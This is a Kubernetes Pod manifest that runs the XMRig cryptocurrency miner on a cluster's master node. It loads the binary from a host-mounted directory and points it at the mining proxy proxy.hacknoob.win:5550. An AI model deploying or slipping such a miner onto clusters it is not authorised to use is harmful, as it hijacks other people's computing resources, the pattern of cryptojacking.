apiVersion: v1
kind: Pod
metadata:
  name: xmrig-exec-m
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: kubernetes.io/hostname
            operator: In
            values:
            - master
  containers:
  - name: xmrig-container-m
    image: busybox
    command:
    - ./xmrig
    - -t
    - "2"
    - -o
    - proxy.hacknoob.win:5550
    - -u
    - master
    - -a
    - rx/0
    - --cpu-no-yield
    - --nicehash
    - --randomx-1gb-pages
    volumeMounts:
    - name: xmrig-volume-m
      mountPath: /home/manager/xmrig/build/
  volumes:
  - name: xmrig-volume-m
    hostPath:
      path: /home/manager/xmrig/build/
